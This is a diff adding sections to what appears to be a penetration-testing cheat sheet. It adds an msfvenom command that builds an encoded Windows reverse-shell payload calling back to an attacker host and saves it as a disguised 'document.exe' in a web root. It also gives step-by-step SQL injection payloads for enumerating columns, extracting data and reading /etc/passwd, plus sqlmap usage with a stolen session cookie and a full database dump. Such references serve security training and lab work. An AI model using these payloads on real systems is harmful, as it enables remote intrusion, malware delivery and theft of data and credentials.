@@ -371,6 +371,61 @@ For UDP use -sU
     document.body.appendChild(link);
     link.click();</script>
 
+Create a shell reversal with `msfvenom`
+
+    msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker listening port> EXITFUNC=thread -f exe -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai > /var/www/html/document.exe
+
+## SQL Injection
+### Principle 
+Find any input which will be part of a SQL Query
+
+In the input vulnerable to SQL injection, insert:
+
+    ' or 1=1 --
+
+
+Finishing the query with `;` instead of `--` will most likely end up throwing an error
+
+### Exploitation
+
+Step 1: Find out the number of columns fetched
+
+    ' ORDER BY <num> --
+Increment `<num>` until an error is thrown
+
+Step 2: Display injected data
+
+    ' UNION SELECT 1,2,3,...,<num> --
+
+This inject "1", "2"... in the query's result.  
+If you are manipulating a php page with an ID like `edit.php?id=1' UNION SELECT 1,2,3,4--`, you can change the id until your data is displayed
+
+Step 3: Extract information
+
+Once your data is displayed, switch from data injection to data extraction by replacing `UNION SELECT 1,2,3,4` with something like
+
+    UNION SELECT @@version, user() ...
+
+Useful functions:
+  - `@@version` Version of the SQL server
+  - `user()` Current user running the query
+  - `LOAD_FILE('/etc/passwd')` Loads a requested file
+  - `UPLOAD_FILE('<filepath>')` That could be used with XSS to upload a backdoor
+
+### Tool
+
+sqlmap  
+https://www.kali.org/tools/sqlmap/
+
+sqlmap goal is to detect and take advantage of SQL injection vulnerabilities in web applications. Once it detects one or more SQL injections on the target host, the user can choose among a variety of options to perform an extensive back-end database management system fingerprint, retrieve DBMS session user and database, enumerate users, password hashes, privileges, databases, dump entire or user’s specific DBMS tables/columns, run his own SQL statement, read specific files on the file system and more.
+
+#### Usage
+
+    sqlmap -u "<page with sql inj. vuln>" --cookie "<session cookie>"
+
+Options:
+ - `--dump` SQL dump of the database
+
 # Lexical
 ## Samba
 Search also: smb
